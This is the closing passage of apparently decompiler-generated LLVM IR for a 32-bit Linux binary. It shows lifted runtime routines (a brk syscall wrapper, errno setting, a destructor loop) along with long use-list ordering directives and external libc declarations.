  uselistorder i8 0, { 46, 47, 85, 86, 68, 33, 43, 69, 6, 87, 88, 89, 90, 58, 91, 92, 93, 94, 95, 96, 34, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 2, 112, 113, 114, 115, 48, 52, 53, 49, 54, 50, 51, 55, 0, 56, 57, 60, 62, 59, 7, 61, 8, 63, 64, 65, 66, 67, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 70, 25, 26, 71, 27, 28, 29, 30, 31, 32, 72, 73, 74, 75, 76, 5, 77, 78, 9, 79, 80, 81, 82, 83, 84, 35, 36, 116, 117, 3, 119, 120, 118, 121, 122, 123, 124, 4, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 44, 145, 1, 146, 37, 45, 38, 39, 40, 41, 42 }
  uselistorder i32 2, { 57, 58, 59, 1, 90, 21, 91, 29, 54, 0, 30, 49, 31, 50, 32, 51, 15, 2, 86, 20, 3, 4, 5, 80, 6, 7, 8, 22, 23, 92, 9, 10, 27, 11, 33, 24, 28, 36, 34, 35, 17, 16, 25, 37, 26, 38, 62, 63, 76, 77, 65, 60, 64, 66, 67, 68, 69, 70, 71, 72, 73, 61, 74, 75, 13, 55, 40, 39, 81, 82, 83, 84, 85, 41, 44, 42, 45, 19, 43, 12, 46, 52, 47, 53, 48, 87, 88, 89, 14, 18, 78, 79, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 56 }
  uselistorder i8* null, { 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8054a77, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a75, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8054a27, { 1, 0 }
  uselistorder label %dec_label_pc_8054a03, { 1, 0 }
}

define i32 @function_8054a7d() local_unnamed_addr {
dec_label_pc_8054a7d:
  %v0_8054a7d = load i32, i32* @eax, align 4
  %v1_8054a7d = add i32 %v0_8054a7d, 28
  %v2_8054a7d = inttoptr i32 %v1_8054a7d to i32*
  %v3_8054a7d = load i32, i32* %v2_8054a7d, align 4
  store i32 %v3_8054a7d, i32* @global_var_8056f98.247, align 8
  %v1_8054a86 = add i32 %v0_8054a7d, 44
  %v2_8054a86 = inttoptr i32 %v1_8054a86 to i32*
  %v3_8054a86 = load i32, i32* %v2_8054a86, align 4
  store i32 %v3_8054a86, i32* @global_var_8056f9c.248, align 4
  ret i32 %v3_8054a86

; uselistorder directives
  uselistorder i32 44, { 7, 5, 4, 11, 13, 12, 8, 9, 10, 0, 2, 6, 14, 15, 16, 17, 1, 3 }
  uselistorder i32 28, { 29, 26, 27, 15, 24, 25, 30, 5, 6, 12, 7, 10, 11, 8, 16, 9, 17, 18, 19, 20, 21, 23, 22, 0, 28, 1, 13, 31, 4, 14, 3, 2, 32, 33, 34 }
}

define i32 @function_8054a8f(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054a8f:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054a8f = load i32, i32* @ebx, align 4
  store i32 %v0_8054a8f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8054aa2 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8054aa2, i32* @global_var_80569b8.246, align 8
  %v7_8054aad = icmp ult i32 %v1_8054aa2, %arg1
  %v1_8054aaf = icmp eq i1 %v7_8054aad, false
  br i1 %v1_8054aaf, label %dec_label_pc_8054abf, label %dec_label_pc_8054ab1

dec_label_pc_8054ab1:                             ; preds = %dec_label_pc_8054a8f
  %v1_8054ab1 = call i32 @function_8052779(i32 %v0_8054a8f)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8054ab9 = inttoptr i32 %v1_8054ab1 to i32*
  store i32 12, i32* %v1_8054ab9, align 4
  %v0_8054abf.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054ac3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054abf

dec_label_pc_8054abf:                             ; preds = %dec_label_pc_8054a8f, %dec_label_pc_8054ab1
  %v2_8054ac3 = phi i32 [ %v0_8054a8f, %dec_label_pc_8054a8f ], [ %v2_8054ac3.pre, %dec_label_pc_8054ab1 ]
  %v0_8054abf = phi i32 [ 0, %dec_label_pc_8054a8f ], [ %v0_8054abf.pre, %dec_label_pc_8054ab1 ]
  store i32 %v2_8054ac3, i32* @ebx, align 4
  ret i32 %v0_8054abf

; uselistorder directives
  uselistorder i32 %v1_8054aa2, { 1, 0 }
  uselistorder i32 12, { 124, 110, 111, 112, 113, 114, 78, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 104, 105, 106, 107, 108, 109, 140, 158, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 71, 157, 72, 115, 116, 117, 118, 119, 67, 74, 68, 75, 69, 76, 70, 77, 81, 82, 91, 92, 93, 94, 83, 95, 86, 79, 85, 87, 88, 89, 96, 80, 84, 28, 90, 97, 103, 66, 98, 100, 101, 29, 99, 30, 31, 32, 33, 120, 0, 121, 122, 123, 34, 35, 36, 37, 38, 39, 102, 1, 2, 26, 10, 9, 8, 16, 64, 21, 43, 44, 42, 17, 49, 41, 47, 48, 18, 159, 7, 45, 46, 4, 6, 40, 160, 65, 161, 165, 162, 163, 164, 50, 51, 52, 53, 19, 20, 54, 55, 56, 166, 57, 58, 59, 60, 61, 62, 63, 5, 22, 23, 11, 12, 13, 14, 15, 167, 24, 3, 25, 168, 169, 27, 73 }
  uselistorder i32* @global_var_80569b8.246, { 1, 0, 2 }
  uselistorder i32 45, { 1, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_8054abf, { 1, 0 }
}

define i32 @function_8054ac5() local_unnamed_addr {
dec_label_pc_8054ac5:
  %v0_8054ac8 = load i32, i32* @eax, align 4
  %v1_8054aca = sub i32 0, %v0_8054ac8
  %v1_8054acc = call i32 @function_8052779(i32 ptrtoint (i32* @0 to i32))
  %v2_8054ad1 = inttoptr i32 %v1_8054acc to i32*
  store i32 %v1_8054aca, i32* %v2_8054ad1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_8052779, { 37, 36, 53, 35, 34, 45, 1, 33, 56, 32, 31, 30, 0, 43, 42, 57, 29, 28, 27, 25, 24, 23, 41, 40, 44, 4, 18, 5, 55, 54, 39, 38, 17, 52, 16, 11, 20, 19, 51, 10, 15, 14, 50, 26, 22, 49, 13, 21, 12, 9, 48, 8, 7, 47, 46, 2, 6, 3 }
  uselistorder i32* @0, { 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 7, 8, 9, 18, 13, 16, 17, 14, 10, 11, 12, 15, 32, 33, 34, 35, 36, 37, 19, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 97, 96, 201, 95, 129, 130, 181, 182, 183, 131, 132, 128, 149, 148, 144, 145, 146, 147, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 98, 184, 185, 186, 187, 188, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 202, 203, 204, 205, 206, 207 }
}

define i32 @function_8054ae0() local_unnamed_addr {
dec_label_pc_8054ae0:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8054aec = load i32, i32* @global_var_8056844.233, align 4
  %v10_8054af1 = icmp eq i32 %v0_8054aec, -1
  br i1 %v10_8054af1, label %dec_label_pc_8054b02, label %dec_label_pc_8054af6.preheader

dec_label_pc_8054af6.preheader:                   ; preds = %dec_label_pc_8054ae0
  br label %dec_label_pc_8054af6

dec_label_pc_8054af6:                             ; preds = %dec_label_pc_8054af6.preheader, %dec_label_pc_8054af6
  %v4_8054af9 = phi i32 [ %v0_8054aec, %dec_label_pc_8054af6.preheader ], [ %v2_8054afb, %dec_label_pc_8054af6 ]
  %v0_8054af6 = phi i32 [ ptrtoint (i32* @global_var_8056844.233 to i32), %dec_label_pc_8054af6.preheader ], [ %v1_8054af6, %dec_label_pc_8054af6 ]
  %v1_8054af6 = add i32 %v0_8054af6, -4
  call void @__pseudo_call(i32 %v4_8054af9)
  %v1_8054afb = inttoptr i32 %v1_8054af6 to i32*
  %v2_8054afb = load i32, i32* %v1_8054afb, align 4
  %v10_8054afd = icmp eq i32 %v2_8054afb, -1
  %v1_8054b00 = icmp eq i1 %v10_8054afd, false
  br i1 %v1_8054b00, label %dec_label_pc_8054af6, label %dec_label_pc_8054b02.loopexit

dec_label_pc_8054b02.loopexit:                    ; preds = %dec_label_pc_8054af6
  %v2_8054b02.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054b02

dec_label_pc_8054b02:                             ; preds = %dec_label_pc_8054b02.loopexit, %dec_label_pc_8054ae0
  %v2_8054b02 = phi i32 [ %v2_8054b02.pre, %dec_label_pc_8054b02.loopexit ], [ %tmp6, %dec_label_pc_8054ae0 ]
  ret i32 %v2_8054b02

; uselistorder directives
  uselistorder i32 %v0_8054aec, { 1, 0 }
  uselistorder i1 false, { 125, 126, 28, 29, 31, 30, 127, 128, 129, 97, 98, 130, 133, 134, 135, 136, 137, 139, 11, 140, 141, 138, 132, 131, 25, 142, 143, 144, 1, 146, 147, 0, 148, 99, 100, 101, 102, 103, 104, 12, 149, 150, 151, 3, 152, 153, 154, 155, 2, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 156, 79, 80, 81, 82, 83, 84, 85, 86, 87, 169, 170, 171, 172, 173, 174, 175, 176, 177, 10, 179, 178, 183, 180, 181, 182, 13, 184, 185, 145, 26, 4, 27, 186, 187, 15, 105, 106, 107, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 16, 198, 108, 109, 110, 199, 200, 201, 5, 32, 6, 202, 203, 204, 35, 45, 50, 51, 36, 53, 46, 47, 48, 52, 33, 34, 37, 38, 39, 40, 41, 42, 43, 44, 49, 54, 55, 78, 76, 18, 77, 19, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 75, 70, 73, 88, 89, 90, 91, 92, 93, 94, 20, 95, 96, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 71, 72, 74, 205, 206, 207, 208, 209, 7, 211, 212, 213, 210, 214, 215, 216, 217, 218, 219, 8, 220, 221, 222, 223, 17, 224, 225, 226, 227, 228, 229, 230, 22, 21, 231, 23, 232, 233, 234, 235, 9, 24, 14, 236 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 15, 16, 17, 18, 102, 103, 104, 105, 11, 106, 3, 101, 19, 97, 12, 98, 99, 100, 13, 0, 9, 10, 107, 108, 109, 110, 111, 112, 113, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 7, 57, 8, 58, 59, 60, 2, 6, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 4, 5, 89, 90, 91, 92, 93, 94, 95, 1, 96 }
  uselistorder i32 ptrtoint (i32* @global_var_8056844.233 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 27, 28, 0, 121, 204, 76, 122, 77, 78, 123, 79, 124, 80, 125, 81, 126, 82, 127, 83, 128, 84, 129, 85, 130, 86, 131, 25, 26, 13, 12, 87, 88, 132, 89, 133, 90, 134, 29, 1, 135, 75, 91, 92, 136, 137, 138, 15, 139, 14, 140, 94, 93, 141, 205, 17, 18, 142, 16, 143, 30, 206, 31, 144, 207, 34, 33, 35, 36, 22, 37, 95, 38, 145, 32, 208, 11, 146, 147, 117, 148, 19, 39, 2, 96, 209, 210, 97, 202, 40, 98, 149, 99, 150, 100, 151, 73, 74, 152, 101, 153, 102, 154, 103, 155, 104, 156, 105, 157, 106, 158, 107, 159, 108, 160, 109, 161, 110, 162, 111, 163, 112, 164, 113, 165, 114, 166, 115, 167, 41, 168, 169, 3, 170, 20, 4, 171, 42, 172, 116, 211, 118, 43, 173, 174, 198, 199, 175, 194, 200, 44, 176, 177, 178, 179, 195, 48, 180, 181, 182, 183, 184, 185, 47, 186, 196, 45, 46, 187, 197, 188, 189, 49, 190, 201, 5, 50, 51, 52, 53, 54, 191, 192, 23, 6, 55, 193, 21, 10, 9, 8, 7, 56, 203, 57, 58, 59, 60, 61, 24, 62, 212, 213, 214, 63, 215, 216, 69, 64, 217, 65, 66, 67, 68, 218, 70, 219, 71, 72, 220, 221, 119, 120 }
  uselistorder i32 1, { 276, 277, 48, 160, 161, 416, 417, 418, 419, 162, 516, 278, 20, 19, 21, 279, 69, 68, 67, 280, 50, 281, 283, 282, 18, 285, 284, 106, 287, 286, 24, 288, 74, 289, 112, 290, 46, 291, 111, 292, 119, 293, 100, 294, 295, 26, 25, 27, 185, 95, 297, 296, 299, 298, 85, 300, 70, 302, 301, 49, 303, 307, 306, 305, 304, 41, 517, 518, 519, 310, 309, 308, 72, 73, 71, 163, 311, 313, 312, 101, 164, 260, 414, 147, 319, 318, 317, 316, 315, 314, 52, 53, 186, 320, 480, 481, 482, 258, 483, 321, 11, 14, 12, 10, 13, 165, 261, 324, 323, 322, 99, 187, 521, 522, 523, 325, 96, 524, 525, 166, 526, 527, 528, 17, 15, 16, 262, 520, 188, 107, 108, 109, 110, 189, 167, 454, 455, 456, 457, 328, 327, 326, 121, 120, 122, 190, 329, 83, 84, 192, 529, 530, 531, 532, 533, 534, 535, 536, 537, 191, 538, 539, 540, 541, 542, 168, 543, 544, 126, 169, 545, 546, 547, 548, 170, 171, 549, 550, 551, 331, 330, 58, 57, 59, 61, 60, 172, 173, 332, 174, 175, 193, 336, 335, 334, 333, 75, 194, 263, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 195, 196, 353, 352, 354, 176, 357, 356, 355, 54, 197, 358, 359, 40, 360, 125, 362, 361, 51, 363, 76, 364, 105, 365, 104, 367, 366, 28, 368, 29, 369, 47, 23, 371, 370, 77, 372, 91, 374, 373, 113, 376, 375, 98, 377, 102, 379, 378, 45, 380, 22, 381, 97, 94, 552, 553, 554, 555, 259, 382, 38, 34, 37, 35, 36, 39, 556, 557, 127, 128, 558, 559, 0, 560, 561, 562, 563, 564, 198, 565, 199, 566, 384, 383, 124, 484, 177, 56, 55, 567, 178, 241, 568, 569, 179, 570, 571, 200, 572, 132, 86, 87, 420, 133, 385, 89, 90, 88, 573, 574, 575, 386, 31, 32, 30, 33, 576, 577, 269, 78, 80, 79, 82, 81, 578, 270, 42, 43, 44, 423, 424, 425, 426, 427, 428, 429, 437, 438, 439, 201, 440, 430, 207, 441, 213, 433, 215, 421, 209, 432, 205, 434, 203, 435, 442, 216, 211, 422, 212, 217, 218, 431, 210, 214, 206, 204, 202, 436, 443, 219, 208, 453, 451, 452, 444, 445, 446, 447, 449, 220, 450, 115, 117, 116, 114, 118, 448, 264, 387, 123, 458, 459, 460, 461, 246, 245, 140, 129, 462, 463, 180, 138, 139, 130, 464, 465, 181, 137, 247, 249, 466, 467, 265, 468, 469, 470, 242, 243, 471, 472, 244, 250, 248, 473, 474, 475, 221, 476, 477, 478, 184, 479, 390, 389, 388, 63, 64, 65, 62, 66, 391, 271, 392, 222, 182, 266, 393, 395, 394, 148, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 223, 495, 496, 497, 498, 159, 224, 267, 225, 268, 515, 226, 400, 399, 398, 397, 396, 103, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 405, 404, 272, 275, 403, 402, 273, 401, 92, 93, 1, 251, 2, 149, 150, 579, 580, 581, 582, 583, 134, 135, 584, 585, 586, 587, 588, 230, 141, 142, 229, 143, 233, 144, 589, 590, 231, 145, 146, 232, 591, 136, 131, 592, 593, 594, 595, 596, 252, 151, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 237, 158, 157, 607, 253, 152, 608, 609, 610, 611, 612, 234, 613, 614, 235, 615, 254, 153, 616, 255, 154, 617, 618, 256, 155, 619, 620, 257, 156, 621, 622, 623, 624, 625, 236, 626, 628, 629, 627, 238, 630, 631, 632, 633, 227, 228, 634, 635, 636, 637, 239, 415, 240, 638, 183, 412, 411, 410, 409, 408, 407, 406, 274, 8, 6, 5, 3, 4, 7, 9, 413 }
  uselistorder label %dec_label_pc_8054af6, { 1, 0 }
}

define i32 @function_8054b06() local_unnamed_addr {
entry:
  %v0_8054b09 = load i32, i32* @ebx, align 4
  %v1_8054b0a = call i32 @function_80480b0(i32 %v0_8054b09)
  store i32 %v1_8054b0a, i32* @eax, align 4
  %v0_8054b15 = call i32 @function_80480c0()
  ret i32 %v0_8054b15

; uselistorder directives
  uselistorder i32* @eax, { 9, 50, 51, 53, 54, 55, 56, 58, 16, 59, 1, 57, 5, 8, 52, 60, 62, 63, 61, 34, 35, 64, 70, 65, 66, 68, 69, 67, 37, 38, 17, 2, 3, 10, 24, 26, 25, 27, 31, 32, 33, 28, 29, 30, 36, 6, 18, 39, 11, 40, 41, 42, 12, 43, 0, 13, 14, 44, 45, 46, 47, 15, 71, 19, 20, 21, 72, 73, 74, 75, 76, 22, 23, 77, 48, 49, 4, 7 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 685, 70, 396, 71, 474, 475, 72, 476, 477, 478, 73, 145, 146, 585, 586, 74, 480, 686, 687, 688, 202, 689, 690, 691, 564, 587, 588, 692, 465, 464, 693, 694, 695, 466, 589, 590, 591, 592, 462, 696, 697, 698, 75, 699, 147, 704, 705, 10, 76, 397, 11, 398, 399, 707, 708, 139, 709, 77, 378, 78, 203, 204, 0, 700, 701, 702, 79, 463, 389, 80, 400, 710, 1, 148, 149, 81, 711, 712, 82, 83, 714, 713, 26, 27, 715, 718, 205, 379, 719, 721, 720, 24, 25, 722, 703, 593, 594, 595, 596, 401, 402, 53, 597, 201, 403, 150, 84, 723, 30, 380, 85, 151, 727, 730, 729, 28, 29, 733, 734, 735, 736, 737, 152, 738, 739, 740, 206, 731, 207, 732, 208, 404, 565, 64, 566, 153, 405, 567, 568, 741, 742, 743, 744, 745, 746, 747, 748, 749, 154, 155, 750, 406, 762, 407, 408, 209, 381, 409, 210, 382, 86, 410, 751, 752, 87, 88, 211, 383, 66, 753, 754, 755, 89, 90, 212, 384, 65, 756, 140, 757, 55, 758, 759, 761, 411, 760, 2, 728, 716, 717, 467, 468, 470, 469, 31, 32, 3, 156, 471, 472, 473, 479, 598, 599, 412, 413, 600, 601, 602, 603, 604, 605, 606, 607, 414, 481, 608, 763, 726, 482, 764, 609, 610, 483, 706, 67, 157, 724, 484, 611, 725, 612, 765, 485, 766, 767, 415, 768, 8, 91, 416, 769, 213, 770, 771, 158, 772, 12, 33, 56, 13, 57, 14, 773, 4, 34, 58, 15, 59, 16, 93, 92, 60, 17, 94, 95, 486, 68, 613, 614, 96, 417, 391, 774, 775, 776, 777, 778, 779, 99, 98, 97, 780, 167, 101, 100, 102, 418, 781, 137, 419, 487, 420, 421, 9, 103, 422, 61, 18, 104, 423, 105, 424, 425, 426, 490, 491, 492, 427, 159, 493, 495, 496, 497, 428, 509, 510, 511, 512, 513, 107, 108, 429, 514, 515, 498, 430, 431, 520, 521, 519, 507, 508, 488, 489, 516, 517, 518, 499, 500, 501, 502, 503, 504, 505, 506, 19, 142, 143, 138, 432, 106, 433, 522, 562, 563, 559, 560, 561, 141, 557, 558, 109, 434, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 392, 435, 535, 436, 110, 437, 537, 538, 539, 540, 541, 160, 161, 542, 543, 544, 438, 494, 552, 553, 554, 555, 545, 546, 547, 551, 556, 111, 162, 536, 112, 385, 439, 440, 393, 394, 569, 570, 47, 45, 441, 46, 44, 442, 571, 572, 573, 574, 575, 576, 577, 168, 443, 578, 579, 580, 581, 386, 444, 445, 582, 583, 69, 584, 163, 113, 176, 615, 114, 183, 184, 185, 174, 175, 35, 36, 616, 617, 618, 115, 51, 619, 620, 621, 622, 116, 50, 623, 624, 625, 626, 117, 49, 627, 628, 629, 630, 118, 48, 631, 632, 633, 177, 178, 179, 180, 181, 182, 634, 635, 172, 171, 636, 169, 7, 6, 170, 637, 173, 638, 186, 639, 187, 640, 188, 641, 189, 642, 644, 645, 646, 643, 647, 648, 190, 191, 649, 164, 650, 165, 119, 673, 20, 62, 387, 446, 447, 448, 651, 657, 192, 652, 653, 193, 654, 194, 655, 195, 656, 39, 658, 196, 197, 659, 198, 660, 661, 199, 662, 200, 663, 664, 665, 666, 449, 667, 668, 669, 670, 38, 214, 120, 121, 450, 451, 671, 672, 52, 63, 122, 452, 37, 215, 217, 218, 453, 123, 124, 216, 388, 125, 548, 549, 550, 21, 126, 395, 22, 219, 127, 128, 674, 675, 676, 677, 678, 679, 782, 783, 680, 681, 784, 785, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 786, 787, 788, 789, 790, 791, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 43, 847, 848, 849, 850, 851, 852, 853, 129, 454, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 455, 892, 884, 885, 886, 887, 888, 889, 890, 891, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 130, 456, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 220, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 968, 967, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 131, 457, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 132, 458, 1017, 1018, 390, 1019, 1020, 459, 1021, 1022, 1023, 133, 460, 1024, 54, 1025, 23, 40, 41, 42, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 166, 134, 135, 5, 682, 683, 684, 136, 461, 144, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041 }
  uselistorder i32* @ebx, { 22, 372, 373, 231, 232, 27, 374, 2, 375, 376, 377, 378, 182, 183, 379, 24, 380, 381, 382, 383, 384, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 3, 252, 253, 254, 23, 385, 386, 387, 388, 389, 390, 391, 392, 393, 20, 21, 402, 403, 404, 405, 17, 4, 16, 396, 399, 400, 401, 394, 406, 407, 408, 409, 410, 411, 412, 413, 395, 255, 256, 422, 423, 424, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 5, 439, 440, 425, 426, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 6, 196, 197, 198, 199, 200, 201, 202, 441, 466, 467, 468, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 18, 452, 453, 454, 455, 456, 7, 457, 458, 459, 460, 461, 462, 463, 464, 465, 420, 421, 25, 26, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 28, 285, 286, 469, 470, 418, 419, 29, 471, 472, 287, 288, 289, 290, 30, 397, 398, 414, 415, 31, 291, 292, 416, 417, 293, 294, 473, 474, 32, 475, 476, 477, 33, 295, 296, 8, 297, 298, 34, 35, 478, 479, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 138, 139, 140, 156, 10, 157, 158, 159, 160, 145, 146, 161, 143, 136, 142, 144, 147, 148, 149, 137, 162, 141, 150, 151, 152, 153, 154, 155, 163, 164, 165, 166, 167, 168, 178, 179, 180, 9, 181, 169, 170, 171, 172, 173, 174, 175, 176, 177, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 11, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 301, 299, 300, 0, 302, 303, 304, 305, 306, 307, 12, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 19, 357, 358, 359, 360, 361, 362, 363, 480, 481, 482, 364, 365, 366, 367, 483, 484, 485, 486, 13, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 487, 488, 489, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 1, 519, 520, 521, 522, 523, 15, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 14, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 368, 369, 370, 371 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

